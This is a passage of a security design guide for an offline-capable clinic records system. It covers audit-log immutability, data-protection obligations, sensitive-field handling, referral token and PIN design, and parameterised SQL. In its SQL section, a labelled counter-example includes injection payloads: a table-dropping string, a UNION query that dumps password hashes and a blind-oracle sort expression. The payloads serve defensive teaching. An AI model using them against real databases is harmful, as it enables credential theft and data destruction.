| **Absolute offline retention cap** | `LOCAL_RETENTION_MAX_DAYS` (default **14**, hard ceiling). A pruning job deletes synced local rows older than the cap; un-synced rows are never pruned. | Even a compliant device should not accumulate years of history in a browser profile. A tight cap means a stolen device leaks a recent window, not the whole history. This directly reduces the severity of T1. |
| **Replica contains this clinic's data only** | The device syncs from a single-tenant API holding exactly one clinic's records | The blast radius of a stolen device is one clinic, and there is no cross-tenant leak to reason about |
| **Storage quota monitoring** | Surface `navigator.storage.estimate()`; warn before the browser starts evicting | Silent eviction looks exactly like data loss to a user |

> **State the tension out loud in your report.** The absolute retention cap is a genuine trade-off: pruning local history means an offline device cannot see an old record. That is a real clinical inconvenience, accepted to bound the consequence of a stolen device. Two weeks is a defensible number for a PHC, where most care is episodic and recent; justify it rather than asserting it.

### 6.5 Audit logging

`audit_logs` is the system's memory of who did what. Its value is entirely in its **integrity**, and architecture §5 is explicit: append-only, server-side, **never synced to clients**.

```
audit_logs
  id              BIGSERIAL  PK          -- monotonic: gaps are detectable
  occurred_at     TIMESTAMPTZ NOT NULL DEFAULT now()
  actor_user_id   UUID NULL              -- NULL for unauthenticated (referral access)
  actor_role      TEXT NULL              -- snapshot: roles change, history must not
  actor_device_id UUID NULL
  actor_ip        INET NULL              -- CF-Connecting-IP only when TRUST_PROXY=true
  actor_user_agent TEXT NULL
  session_id      UUID NULL
  action          TEXT NOT NULL          -- 'patient.create', 'payment.void', 'auth.login.failed', …
  category        TEXT NOT NULL          -- auth | clinical | financial | admin | referral | security
  severity        TEXT NOT NULL          -- info | notice | warning | high | critical
  entity_type     TEXT NULL              -- 'patients', 'payments', …
  entity_id       UUID NULL
  outcome         TEXT NOT NULL          -- success | denied | error
  reason          TEXT NULL              -- mandatory for break-glass and voids
  detail          JSONB NOT NULL DEFAULT '{}'::jsonb
                                         -- payload DIGEST and field NAMES, never values
  request_id      TEXT NULL              -- correlates with the application log line
  prev_hash       BYTEA NULL             -- optional hash chain (see below)
  row_hash        BYTEA NULL
```

**What is logged — the list to implement:**

| Category | Events |
|---|---|
| Authentication | `auth.login.success`, `auth.login.failed` (with username attempted and IP, **never the password**), `auth.logout`, `auth.refresh`, `auth.refresh.reuse_detected` (severity `critical`), `auth.offline_session.started`, `auth.offline_session.expired`, `auth.password.changed` |
| Authorisation | `authz.denied` (actor, capability, endpoint, outcome `denied`) — the insider-threat signal |
| Clinical reads | `patient.view`, `encounter.view`, `referral.view.internal` — **including successful reads of `sensitive`-flagged records, with the reason** |
| Clinical writes | `patient.create`, `patient.update`, `vitals.create`, `encounter.create`, `diagnosis.create`, `lab_order.create`, `lab_result.create`, `prescription.create`, `dispense.create`, `admission.create`, `discharge.create` |
| Financial | `payment.create`, `payment.void` (reason mandatory), `invoice.create`, `tariff.update`, `reconciliation.close` |
| Referral | `referral.create`, `referral.view.public` (mirrored from `referral_access_log`), `referral.pin.failed`, `referral.pin.locked`, `referral.revoke`, `referral.expired_access_attempt` |
| Admin | `user.create`, `user.role.change`, `user.suspend`, `device.register`, `device.revoke`, `device.wipe_requested`, `audit.export` |
| Sync | `sync.push.received` (batch size, operation IDs, first/last `updated_at`), `sync.push.rejected` (reason), `sync.anomaly` (backdated timestamps, `created_by`/`sub` mismatch, offline window exceeded) |

**What is never logged:** passwords or password hashes, refresh tokens or access tokens, device private keys, referral tokens or PINs, full request bodies containing patient data, and patient names in log *messages* (patient IDs are fine, and are what you correlate on). §10.6 covers the redaction middleware.

**Immutability — three layers, because one is not enough:**

1. **Application discipline.** No `UPDATE` or `DELETE` against `audit_logs` exists anywhere in `internal/repo/`. Enforce with a code review rule and a grep in CI: `grep -rn "audit_logs" internal/repo/ | grep -iE "update|delete"` must return nothing.
2. **Database grants — the real control.** The API connects as a role that *cannot* modify or delete audit rows:

```sql
-- Migration: 0009_audit_grants.sql  (run as the schema owner / migration role)

-- Two roles: the migration owner, and the runtime API role.
-- The API role must NOT own tables. An owner can ALTER, DROP, and re-grant —
-- ownership quietly defeats every grant below.
CREATE ROLE phc_api LOGIN PASSWORD :'api_password';       -- credentials from Secret Manager
CREATE ROLE phc_migrator LOGIN PASSWORD :'migrator_password';  -- migrations only, never used by the API

GRANT USAGE ON SCHEMA public TO phc_api;

-- Clinical and operational tables: read/write.
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO phc_api;

-- The audit log: append-only. This is the point of the whole migration.
REVOKE ALL ON audit_logs FROM phc_api;
GRANT  SELECT, INSERT ON audit_logs TO phc_api;
REVOKE UPDATE, DELETE, TRUNCATE ON audit_logs FROM phc_api;

-- The sequence must still be usable, or inserts fail.
GRANT USAGE ON SEQUENCE audit_logs_id_seq TO phc_api;

-- Referral access log: same treatment. It is evidence.
REVOKE ALL ON referral_access_log FROM phc_api;
GRANT  SELECT, INSERT ON referral_access_log TO phc_api;

-- Defence in depth: a rule that blocks the operations even if a grant is
-- mistakenly re-added later.
CREATE RULE audit_logs_no_update AS ON UPDATE TO audit_logs DO INSTEAD NOTHING;
CREATE RULE audit_logs_no_delete AS ON DELETE TO audit_logs DO INSTEAD NOTHING;

-- Default privileges for tables created by FUTURE migrations, so a new table
-- does not silently arrive without grants (or with the wrong ones).
ALTER DEFAULT PRIVILEGES FOR ROLE phc_migrator IN SCHEMA public
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO phc_api;

-- Verify after every migration — put this in your migration smoke test:
--   SELECT grantee, privilege_type FROM information_schema.role_table_grants
--    WHERE table_name = 'audit_logs' AND grantee = 'phc_api';
--   Expect exactly: SELECT, INSERT.
```

   Note the deliberate choice: `REVOKE ALL` then re-`GRANT SELECT, INSERT`, rather than relying on never having granted `UPDATE`. Explicit and idempotent beats clever.

3. **Optional tamper evidence.** A `prev_hash`/`row_hash` chain (`row_hash = SHA-256(prev_hash || canonical_row)`) makes deletion or modification *detectable* even by someone with owner rights, since a gap or a mismatch breaks the chain. At PHC write volumes this is cheap. Implement it if you have a day; if not, note it as a production improvement, because "the DBA could still edit rows and you would never know" is a fair criticism of layers 1 and 2 alone.

**Retention:** audit rows are retained longer than clinical data is convenient to keep — a common policy is 7 years for financial-related events and per local health-records law for clinical ones. For the project: keep everything, define the policy in `docs/`, and implement a **partitioned** table by month so retention is a `DROP PARTITION` rather than a mass delete (which would fight the no-delete rule anyway). Note the tension honestly: retention law and data-minimisation principles pull in opposite directions, and the resolution is per-category retention, not one number.

**How an auditor reads it:**

- A dedicated **read-only** role for auditors: `GRANT SELECT ON audit_logs, referral_access_log TO phc_auditor;`. Never the API role.
- A UI at `/admin/audit` with filters for date range, actor, action, category, entity, and outcome — paginated, server-side, no client-side replica.
- `audit.export` itself is audited (who exported, when, how many rows, which filter). Otherwise the export becomes the leak.
- Exports are **CSV with identifiers, hash of the file recorded in the log**, delivered over an authenticated channel, and deleted after the review.
- A standing review procedure: (a) all `severity >= warning` in the period, (b) every `authz.denied` grouped by actor, (c) every sensitive-record view with its reason, (d) every void and its reason, (e) gaps in `audit_logs.id` — a gap is an incident until explained.

### 6.6 Regulatory considerations

> **Read this paragraph first.** The notes below are orientation, not legal advice, and nothing here should be presented as a legal conclusion in your report. Data-protection law is jurisdiction-specific, changes, and depends on facts (who the data controller is, whether a processor agreement exists, whether the data is health data). **Verify the specifics with your supervisor, your institution, and the current text of the relevant statute before you assert anything.** In a viva, "here is the regime I believe applies and here is the control that would satisfy it; I would confirm the detail with counsel" is a *strong* answer. Asserting a legal conclusion you cannot support is a weak one.

**Generic principles that hold in essentially every regime** (and which the design already implements, which is the useful part of this section):

| Principle | Generic statement | Where this system implements it |
|---|---|---|
| Lawful basis | You need a defined legal reason to process health data | Provision of care / vital interests. Document it in the DPIA-style note. |
| Purpose limitation | Collect for a stated purpose; do not repurpose | The system does billing and care; it does **not** do marketing, research, or insurance claims (architecture §1.2 non-goals) — that is purpose limitation, enforced by scope |
| Data minimisation | Collect only what is needed | The public referral payload (§7.7) exposes far less than the internal record |
| Accuracy | Keep data accurate and correctable | Demographics are editable; corrections are audited; clinical facts are append-only with `created_by` |
| Storage limitation | Do not keep data longer than needed | `LOCAL_RETENTION_MAX_DAYS` caps the device copy; server retention is policy-defined; audit retention is set separately and deliberately |
| Integrity and confidentiality | Appropriate technical measures | Encryption in transit and at rest, RBAC, audit logging, device keys |
| Accountability | Be able to demonstrate compliance | This document, the audit log, and the deployment checklist are the demonstration |
| Data subject rights | Access, correction, and often erasure/portability | Access and correction: yes, via the record. **Erasure: effectively no** for a clinical record — health records are typically subject to retention obligations that override erasure. Know this before a patient asks. |
| Breach notification | Notify the regulator and sometimes the data subjects within a deadline | See the incident runbook (§11). Know your deadline *before* you need it. |

**If deployed in Nigeria — the Nigeria Data Protection Act (NDPA) 2023.** It applies to the processing of personal data of data subjects in Nigeria, and it establishes the Nigeria Data Protection Commission. The points a student should be able to *discuss* (and verify):

- **Lawful basis.** Health data is in a special category. Processing for the provision of healthcare, or to protect vital interests where the subject cannot consent, is generally the relevant basis — not consent obtained at a registration desk under time pressure. Understand why "we got them to tick a box" is usually the weaker argument for a clinical record.
- **Data subject rights.** Access, rectification, and objection are the ones that matter operationally; erasure is limited by health-record retention obligations. The practical implementation question for this system: **how would you produce one patient's complete record on request?** Answer: a server-side export by `patient_id` covering every table plus the audit trail of who accessed it. Implementing that export is a good, cheap addition to your admin UI.
- **Breach notification.** The Act provides for notification to the Commission and, in some cases, to data subjects, within a defined period. **Look up the current period and the thresholds; do not guess.** For the project: define who decides, who notifies, and what the notification contains *before* an incident. §11 is the mechanical part of that.
- **Data protection officer and records of processing.** A deployment of this scale would typically need to designate responsibility and keep a record of processing activities. For a student project, your report can serve as a draft record of processing.
- **Cross-border transfer.** Neon and Cloud Run are cloud services that may store data outside Nigeria. The Act addresses transfers abroad and the safeguards they require. This is a genuine, concrete finding: **state which region your Neon project and Cloud Run service are in**, and discuss whether that is appropriate for health data. If you deploy to `europe-west` or `us-central1` for convenience, say so and name the transfer question — that is exactly the sort of thing an examiner rewards.
- **NDPC guidance and the Nigeria Data Protection Regulation (NDPR) legacy instruments** may still inform practice. Verify what is currently in force rather than citing from memory or from an old blog post.

**Framing for your report:** "This system is designed against the generic principles listed in Table X, which are reflected in the controls in §3–§9. If deployed in Nigeria it would additionally be subject to the NDPA 2023; the concrete implications I identified are the cross-border storage question, the breach-notification timeline, and the patient-access export. I have not asserted legal conclusions, and would confirm the specifics before deployment."

### 6.7 Field-level protection for sensitive categories

The question: **should HIV status, mental health notes, and similar fields get stronger protection than the rest of the record?**

#### The honest analysis

**Arguments for extra protection:**

1. **The harm is disproportionate.** A leaked blood pressure reading is embarrassing. A leaked HIV status in a small community causes loss of employment, abandonment, and violence. The controls should be proportionate to the harm, and the harms here differ by an order of magnitude.
2. **Inference leaks are the real problem, and they are not confined to a column.** A patient appearing in the pharmacy queue with a specific antiretroviral regimen tells an observer the same thing a diagnosis column would. Protecting the column but not the regimen protects nothing.
3. **Insiders are the main threat (T3), and they have legitimate access to the surrounding screens.** The nurse needs the vitals screen; the vitals screen need not reveal the diagnosis. A separate capability is the control that matches the threat.
4. **Regulatory expectations increasingly treat health data subsets as special categories**, and a system that can demonstrate it distinguishes them is easier to defend.

**Arguments against (and they are real):**

1. **Column-level encryption fights the offline replica.** If a field is encrypted with a key the client does not hold, the client cannot read it offline — which breaks the core requirement. If the client holds the key, it holds the key, and you have bought obfuscation against a file-read attacker while an attacker with the running app still sees plaintext. The security gain is narrower than it first appears, and the complexity cost is paid everywhere: every query, every sync payload, every export, every report.
2. **Cryptographic granularity is a maintenance liability.** Encrypted columns cannot be indexed, searched, sorted, or aggregated normally. Deterministic encryption leaks equality patterns. Every new query author must remember which columns are special. In a student project with a fixed deadline, this is how you end up with a half-encrypted schema and a bug where search silently misses patients.
3. **Over-classification degrades care.** If a nurse cannot see that a patient is on antiretrovirals, they cannot check for a dangerous interaction during triage. Excessive restriction in a clinical system causes *clinical* harm, which is a patient-safety failure, not just an inconvenience.
4. **The realistic threat model is insider snooping, not file cryptanalysis.** Against a curious cashier, RBAC and audit logging work and column encryption does nothing (the app decrypts for them if they have the capability). Match the control to the actual threat.

#### Recommendation for this project

Implement **a `sensitive` flag with stricter RBAC and per-access auditing. Do not implement column-level encryption.**

Concretely:

1. **A `sensitive` boolean (or `sensitivity` enum: `normal` / `sensitive` / `restricted`) on the clinical tables** — `diagnoses`, `lab_orders`, `lab_results`, `prescriptions`, `dispenses`, `encounters`. Add a GIN index on a `sensitivity_tags TEXT[]` if you want finer categories (`hiv`, `mental_health`, `gbv`, `substance_use`).
2. **Propagation is mandatory.** When a diagnosis is flagged, the flag propagates to the lab orders, results, prescriptions, and dispenses arising from that encounter. **This is the part that actually delivers the protection**, because it closes the inference path (T19).
3. **A narrower capability.** `view_sensitive` is granted to `doctor`, `admin`, and to `nurse`/`pharmacist` on an `Own`-scoped basis (the patient is in their active encounter). `front_desk`, `cashier`, `accountant`, and `lab_scientist` do not get it — they get a redacted view: the record exists, the patient is in the queue, the billing line item is "Laboratory investigation" with no test name.
4. **Access requires a reason and is always audited.** A modal on first access in a session: "This record is flagged sensitive. State your reason for access." Written to `audit_logs` with `severity = 'notice'`, the actor, the record, and the reason. Auditors review these; the review is what makes the control real. Implement break-glass this way rather than blocking access outright, because in a clinical emergency the record must be reachable.
5. **Redaction is a service-layer concern, not a UI concern.** The API returns the redacted shape to a caller without the capability; the SPA never receives the sensitive field. This matters because of T18 — if you send the data and hide it in the UI, you have sent the data.
6. **The offline replica carries the flag with the row**, so offline redaction works with the same logic. Document that a determined attacker with the device file can read the flagged fields anyway: **the flag is an access-control and audit control, not a confidentiality control against a local attacker.** That distinction is the honest one, and stating it shows you understand exactly what you did and did not buy.

**What you would do differently in production:** envelope encryption with per-category keys held in a KMS, decryption only in the service layer for callers with the capability, and a client that works with *redacted* sensitive fields offline while requiring connectivity for the full record. That preserves the offline requirement for the 95% of care that is not special-category data, while making the sensitive subset genuinely unreadable at rest. It is the right answer and it is not a one-semester answer. Say so.

---

## 7. Referral link security

### 7.1 The shape of the problem

A referral note must be readable **by a clinician at another facility who has no account** in this system, using a phone, from a QR code printed on a 58–80 mm thermal slip. That is an unauthenticated public read of sensitive clinical data, and it is a requirement, not an accident.

The design therefore does not rely on authentication at all. It relies on four stacked controls:

| Control | Property | Defeats |
|---|---|---|
| 256-bit random token in the URL | Unguessability | Enumeration, IDOR |
| 6-digit PIN on the physical slip | Proof of physical possession | A leaked URL alone |
| 48-hour expiry | Time bound | Long-lived leaked links |
| Access log | Detection | "Who read this?" after the fact |

Every one of these is load-bearing. Remove any one and the design fails: without the token, IDs are enumerable; without the PIN, a forwarded URL is enough; without expiry, a leak is permanent; without the log, a leak is invisible. Say this in your defence — it shows the design is a system, not a pile of features.

### 7.2 Token generation

```ts
// Generated server-side at referral creation. 32 bytes = 256 bits of entropy.
const tokenBytes = new Uint8Array(32);
crypto.getRandomValues(tokenBytes);          // CSPRNG; never Math.random()
const token = base64url(tokenBytes);         // 43 chars, URL-safe, no padding
```

```go
// Go equivalent, if the token is minted server-side.
tokenBytes := make([]byte, 32)
if _, err := rand.Read(tokenBytes); err != nil {   // crypto/rand, not math/rand
    return nil, fmt.Errorf("referral: mint token: %w", err)
}
token := base64.RawURLEncoding.EncodeToString(tokenBytes)
```

Rules:

- **`crypto.getRandomValues` / `crypto/rand` only.** `Math.random()` and `math/rand` are not cryptographically secure, and in Go `math/rand`'s default source is deterministic enough to be predicted. This is the kind of bug that turns a 256-bit token into a 32-bit one.
- **32 bytes, base64url, no padding.** 256 bits of entropy makes brute-force enumeration physically impossible — at a billion guesses per second it is ~10⁶⁰ years. That is the point: enumeration is off the table, so the only attack is leakage.
- **The token is returned exactly once**, in the response to the creating doctor. It is displayed as a QR code and printed. It is not stored in recoverable form.
- **The token is never logged.** Not in the application log, not in the audit log, not in the QR-generation service, not in an error message, not in an analytics event, not in a `Referer` header (see below). Log the `referral_id` instead — you correlate on that.
- **The public page must not leak the token to third parties.** No external scripts, no external fonts, no analytics on `/r/:token`. Set `Referrer-Policy: no-referrer` on the route so the token never travels in a `Referer` header to any outbound link. On the *print* side, make sure the QR is generated locally (the `qrcode` npm package renders client-side to a canvas, which keeps the token off any third-party QR-generation service).
- **The token is a bearer credential.** Anything that has it plus the PIN can read the note. Say that in the UI: "This link grants access to the referral. Anyone with the slip can open it."

### 7.3 Hashing at rest — SHA-256, and why that is correct here

The database stores `access_token_hash` only. Not the token. If the database leaks, an attacker gets hashes, not live links.

**Use SHA-256 (unsalted is fine, and salt is not useful here). Do not use Argon2id for the token.**

Why, given §3.1 says Argon2id for passwords:

| Property | Password | Referral token |
|---|---|---|
| Entropy | Low — human-chosen, maybe 20–40 bits | **256 bits, uniformly random** |
| Attack if the hash leaks | Offline dictionary/brute-force; feasible for weak passwords, which is why the KDF must be slow | Brute-force is not merely slow, it is **information-theoretically hopeless**. There is no dictionary of 2²⁵⁶ values. |
| Cost of a slow KDF | Paid once per login — acceptable | Paid on **every** referral view, including every bogus one, on a public endpoint — a self-inflicted DoS (T17) |
| Best choice | Argon2id, memory-hard | **SHA-256** — fast, sufficient, and side-steps the DoS cost |

This is the general principle worth stating: **a KDF's cost is calibrated to the entropy of what it protects.** Slow hashing exists to make guessing expensive. Against a 256-bit random value, guessing is already impossible, so the only thing a slow hash adds is a CPU bill and an attack surface.

Salt is unnecessary because a salt exists to defeat precomputation across *many* hashes of *guessable* inputs. With 256-bit random inputs there is no rainbow table and no cross-record reuse to prevent. A per-row salt would also prevent looking up the referral by token hash, which is the one query you need.

```sql
-- Lookup by hash. Index it: this is the hot path on a public endpoint.
CREATE UNIQUE INDEX referrals_access_token_hash_idx ON referrals (access_token_hash);

-- Expiry enforced IN THE QUERY, not in the application and not in the UI.
-- A UI-only expiry is a suggestion; this is the control.
SELECT id, referral_id, expires_at, pin_hash
  FROM referrals
 WHERE access_token_hash = $1
   AND revoked_at IS NULL
   AND expires_at > now();
```

**Store the hash as `BYTEA` (32 bytes), not as hex text.** It halves the index size, and it removes any chance of a case-sensitivity bug in a lookup on the hot path.

### 7.4 PIN generation and hashing

The PIN is the second factor, and it is printed on the same piece of paper as the QR code. Be honest about that in your report: **it is a possession check, not an independent factor** — but it does defeat the specific, likely attack of a URL forwarded over WhatsApp without the slip (T6).

```go
// Generation: 6 digits, uniformly distributed, no modulo bias.
// rand.Int with a crypto/rand source is unbiased; n%1000000 on a raw uint32 is not.
n, err := rand.Int(rand.Reader, big.NewInt(1_000_000))
if err != nil { return "", err }
pin := fmt.Sprintf("%06d", n.Int64())   // zero-padded: "004172" is valid
```

**Hashing the PIN: Argon2id, because the PIN is low-entropy.**

Six digits is 10⁶ ≈ 20 bits. That is a *tiny* space — a GPU exhausts it in well under a second against a fast hash. The PIN's security comes from the **online lockout** (§7.5), not from its own entropy; but if the hash ever leaks, a fast hash means the PIN falls immediately. So use Argon2id, and use the **same parameter set as passwords** (`m=65536, t=3, p=2`), because the entropy is arguably lower.

- **Do not log the PIN.** Ever. Not on generation, not on failure, not in a debug line. A PIN in a log file is a PIN in a log file.
- **Do not store the PIN anywhere recoverable.** If the doctor or the receiving facility loses the slip, the answer is "issue a new referral", not "look up the PIN".
- **Constant-time comparison** of the Argon2id output.
- **Never return the PIN in the API response** after creation — it goes to the printer, not to the client's state store. Print it and forget it. (Practical detail: the SPA must print it, so it briefly exists in memory. Ensure it is not written to IndexedDB, not put in a Zustand persisted store, and not included in the referral row that the offline replica keeps.)

### 7.5 Rate limiting and lockout

`/r/:token` is public, so this is the only place in the system where an unauthenticated caller can spend your CPU (T17).

| Limit | Value | Keyed by | On breach |
|---|---|---|---|
| Referral page views | 60 / hour | IP | 429 with `Retry-After` |
| Referral page views | 300 / hour | **token hash** | 429; alert if sustained — a hot token is a leaking token |
| **PIN attempts** | **5 total per referral** | reference `id` | **Hard lockout.** `referrals.pin_locked_at = now()`. Further attempts return the same generic failure. |
| PIN attempts | 10 / hour | IP | 429 |
| PIN attempts | 30 / hour | token hash | 429 |
| Argon2id verifications | Semaphore, ~2 × vCPU | global | Requests queue; excess shed with 503 |

Design rules:

1. **Check the token and the expiry BEFORE any Argon2id work.** An invalid or expired token must be rejected with a cheap indexed lookup, so a flood of garbage tokens cannot pin the CPU. This ordering is the difference between "rate limited" and "down".
2. **The lockout counter is per referral, server-side, and not resettable by the attacker.** Storing it client-side, or in a cache that a restart clears, defeats it.
3. **Responses are indistinguishable.** Wrong PIN, locked referral, and expired token should not be telling apart in the *error body* — return a generic "This referral cannot be opened." Distinguishing them helps an attacker enumerate. In the *audit log*, record the exact reason (you need it for investigation; the attacker cannot read the log).
4. **Lockout is not permanent-by-default.** Provide an admin (or issuing-doctor) unlock that resets the counter and issues a new PIN, and log it. A locked referral in an emergency is a clinical problem.
5. **Cloudflare rate limiting on top of application rate limiting.** Cloudflare's rules absorb volumetric floods before they reach Cloud Run — which matters because cold-starting a Cloud Run instance to reject a request is expensive. Do not rely on Cloudflare alone: limits must also exist in the app for the case where traffic reaches `*.run.app` directly.
6. **Prefer an in-memory limiter with a shared store** (Redis/Memorystore) or a Postgres-backed counter. A per-instance in-memory limiter is bypassed by Cloud Run's horizontal scaling — with 10 instances, a 5-attempt limit is really a 50-attempt limit. If you implement in-memory for the project, **write down that limitation**; it is exactly the kind of thing an examiner will ask about.

### 7.6 Expiry and revocation

**Expiry:** `expires_at = created_at + (REFERRAL_TTL_HOURS hours)` = 48 h by default. Enforced in the SQL `WHERE` clause (§7.3), not in the UI, not in a middleware that a new route might skip. A request for an expired referral returns the same generic error as a bad token, is logged as `referral.expired_access_attempt`, and triggers a "this referral has expired — request a new one" message only *after* the token is known-good (so the message does not confirm token validity to a guesser).

**Revocation:** the issuing doctor (and `admin`) can revoke at any time:

```
POST /referrals/:id/revoke
{ "reason": "issued in error" | "patient declined transfer" | "suspected link leak" }
  → referrals.revoked_at = now(), revoked_reason = $2, revoked_by = actor
  → audit_logs: action = 'referral.revoke', reason, actor
  → the public route immediately returns the generic failure
```

| Rule | Why |
|---|---|
| **Only the issuing doctor or an admin may revoke** | The doctor owns the clinical decision; an unrelated user revoking referrals is an integrity problem |
| **Revocation is immediate and irreversible** | No un-revoke. Reversing a revocation would un-leak a leaked link. Issue a new referral instead. |
| **Revocation does not delete the row** | You need the history: who issued it, who revoked it, why, and who accessed it in between |
| **A revoked referral's access log is preserved** | It is the evidence of the leak you are responding to |
| **Revoking is audited with a reason** | §11.3 depends on being able to answer "when was it revoked and by whom" |

### 7.7 Referral access log

Every view writes to `referral_access_log`. This is the control that turns "we think the link leaked" into "here is who read it".

```
referral_access_log
  id            BIGSERIAL PK
  referral_id   UUID NOT NULL REFERENCES referrals(id)
  accessed_at   TIMESTAMPTZ NOT NULL DEFAULT now()
  access_type   TEXT NOT NULL      -- 'page_view' | 'pin_attempt' | 'pin_success' | 'pin_failed' | 'expired_attempt'
  outcome       TEXT NOT NULL      -- 'success' | 'denied' | 'locked'
  ip            INET               -- CF-Connecting-IP, only when TRUST_PROXY=true
  user_agent    TEXT
  referer       TEXT               -- useful: reveals which chat app or mail client referred it
  country       TEXT               -- from CF-IPCountry; do NOT store city-level geolocation
  token_hash_prefix TEXT          -- first 8 hex chars ONLY, for correlation. Never the token.
  request_id    TEXT
```

Rules:

- **`access_type = 'page_view'` is logged even for the *failure* to supply a PIN.** A view that never gets past the PIN is still a signal.
- **The log is append-only and never synced to clients.** Same grants treatment as `audit_logs` (§6.5). If it were client-readable, an attacker would know what you know.
- **Do not store the full token, ever, in this table.** The `token_hash_prefix` exists so you can correlate a burst of accesses without holding a credential-equivalent.
- **Retention: longer than the referral itself.** This is evidence; a 48-hour referral with a 48-hour log is useless in an investigation. Keep it for the audit retention period.
- **Surface it to the issuing doctor** as "viewed 3 times, last from Lagos at 14:22". That is genuinely useful clinical context — the referring doctor wants to know the note arrived.
- **`referer` is the highest-signal field.** If the referer is `https://web.whatsapp.com/`, you have your leak path. This is worth calling out in your report as a concrete investigative tool.

### 7.8 What the public payload deliberately does NOT contain

The public view exists so another clinician can continue care. Anything not needed for that is not sent. Minimisation is the cheapest security control available: data you do not send cannot leak.

**Included** (the minimum to treat the patient at the receiving facility):

| Field | Why it is needed |
|---|---|
| Referral reference number | For correspondence between facilities |
| Patient display name and age (or DOB where clinically required) | To confirm identity at the receiving end |
| Sex | Clinically relevant for most assessments |
| Referring facility name, clinician name, and contact | So the receiving clinician can ask a question |
| Reason for referral, working diagnosis, relevant findings | The clinical content of the referral |
| Current medications and known allergies | Immediate safety |
| Vitals relevant to the referral | Clinical context |
| Referral date and expiry | The receiving clinician must know the window |
| Urgency | Determines how the case is triaged on arrival |

**Deliberately excluded:**

| Excluded | Why |
|---|---|
| **Full home address** | Not needed to treat; high re-identification value. The facility name and patient name are enough to locate them at the receiving end if needed. |
| **Phone number** | Not needed for clinical care; a leak enables harassment and scams. |
| **Tribe, occupation, marital status** | Collected for the record, irrelevant to the referral, and powerful quasi-identifiers in a small community. |
| **Unrelated clinical history** | The receiving clinician needs the referral, not the whole chart. "Relevant past medical history" (a curated field the doctor fills in) is not the same as "all encounters". |
| **HIV status or other sensitive-flagged diagnoses, unless directly relevant** | If the referral is *for* HIV care, it must be included. If it is a fracture referral, it must not be, even though the record contains it. **Make this an explicit doctor-facing choice, defaulting to excluded**, with the clinical consequence shown. This is the single most important minimisation decision in the system. |
| **Financial data** — invoices, balances, payment history, tariff details | Nothing to do with the receiving clinician's task |
| **Internal identifiers** — internal UUIDs, database IDs, staff user IDs | Unnecessary attack surface and enumeration risk |
| **Other family members' data** | Including a household's records because the patient belongs to one is a straightforward confidentiality breach. The public view renders one patient's referral, full stop. |
| **Audit or access metadata** — who else viewed it, how many times | Lets an attacker confirm what you know |
| **The PIN** | Obviously. But check it twice: it must not be in the JSON, not in an HTML comment, not in a `<meta>` tag, not in a source map. |

**Implementation note:** the public endpoint should be built from a **separate, hand-written response type** — not by marshalling the internal `Referral` struct and deleting fields. Marshalling-then-deleting is how fields get added to the public payload by accident six weeks later. Two structs, deliberately duplicated, with a test asserting the public one's exact field set:

```go
// internal/http/dto/referral_public.go
type PublicReferralNote struct {
    ReferenceNumber string    `json:"reference_number"`
    PatientName     string    `json:"patient_name"`
    PatientAge      int       `json:"patient_age"`
    PatientSex      string    `json:"patient_sex"`
    Urgency         string    `json:"urgency"`
    Reason          string    `json:"reason_for_referral"`
    WorkingDx       string    `json:"working_diagnosis"`
    RelevantHistory string    `json:"relevant_history"`
    Medications     []string  `json:"current_medications"`
    Allergies       []string  `json:"allergies"`
    Vitals          []VitalDTO `json:"vitals"`
    ReferringFacility string    `json:"referring_facility"`
    ReferringClinician string   `json:"referring_clinician"`
    ReferringContact   string   `json:"referring_contact"`
    IssuedAt        time.Time `json:"issued_at"`
    ExpiresAt       time.Time `json:"expires_at"`
} // NOTE: no address, no phone, no tribe/occupation/marital status, no financials,
  // no internal UUIDs, no audit metadata, no full history. Adding a field here is a
  // privacy decision — it requires a review, not just a new struct tag.
```

---

## 8. Input validation and secure coding

### 8.1 SQL: parameterised queries only

The rule, with no exceptions: **user data never becomes SQL text.** pgx supports `$1, $2, …` placeholders natively; use them everywhere.

**Correct:**

```go
// internal/repo/patient_repo.go
const searchPatientsSQL = `
    SELECT id, patient_number, first_name, last_name, date_of_birth,
           phone, created_at, updated_at
      FROM patients
     WHERE deleted_at IS NULL
       AND ($1 = '' OR (first_name ILIKE '%' || $1 || '%'
                     OR last_name  ILIKE '%' || $1 || '%'
                     OR patient_number = $1))
     ORDER BY created_at DESC
     LIMIT $2 OFFSET $3`

func (r *PatientRepo) Search(ctx context.Context, q string, limit, offset int) ([]domain.Patient, error) {
    rows, err := r.pool.Query(ctx, searchPatientsSQL, q, limit, offset)
    if err != nil {
        return nil, fmt.Errorf("search patients: %w", err)
    }
    return pgx.CollectRows(rows, pgx.RowToStructByName[domain.Patient])
}
```

Note what is *not* parameterisable and how it is handled: **column names and sort direction cannot be placeholders.** If you need dynamic ordering, map from an allow-list. Never interpolate the raw value.

```go
// Sorting is the one place an allow-list is mandatory. Anything else is injection.
var sortablePatientColumns = map[string]string{
    "name":       "last_name",
    "number":     "patient_number",
    "created_at": "created_at",
    "dob":        "date_of_birth",
}

func patientOrderBy(sortKey, dir string) (string, error) {
    col, ok := sortablePatientColumns[sortKey]
    if !ok {
        return "", domain.ErrInvalidSortKey   // fail closed; never fall back to a default silently
    }
    if dir != "asc" && dir != "desc" {
        return "", domain.ErrInvalidSortDir
    }
    return col + " " + strings.ToUpper(dir), nil   // safe: both parts come from constants
}
```

**Incorrect — the counter-example. Never ship anything shaped like this:**

```go
// ❌ DO NOT DO THIS. Four separate vulnerabilities in nine lines.

// 1. String concatenation: the search term is SQL now.
query := "SELECT * FROM patients WHERE last_name ILIKE '%" + search + "%'"
//    search = "'; DROP TABLE patients; --"  → and your grants are the only thing left.
//    search = "%' UNION SELECT id, password_hash, null, null FROM users --"  → full credential dump.

// 2. String concatenation in a filter: same problem, different field.
query = "SELECT * FROM patients WHERE patient_number = '" + number + "'"

// 3. Interpolated sort: the classic bypass, because "it's just a column name".
query = "SELECT * FROM invoices ORDER BY " + sortColumn
//    sortColumn = "(CASE WHEN (SELECT substring(password_hash,1,1) FROM users LIMIT 1)='a'
//                   THEN 1 ELSE 1/0 END)"  → a boolean-blind oracle over your user table.

// 4. Interpolated pagination: no injection, but an unbounded LIMIT is a DoS.
query = fmt.Sprintf("SELECT * FROM patients LIMIT %d", limit)   // limit = 100000000
```

Why this matters more than usual in this project: **the sync payload is attacker-controlled** (T9). A modified client can put anything in `patient_name`, and if any code path builds SQL from it, the injection is as good as unauthenticated from the attacker's perspective. Parameterisation is not defence in depth here — it is the primary control.

Two supporting measures:

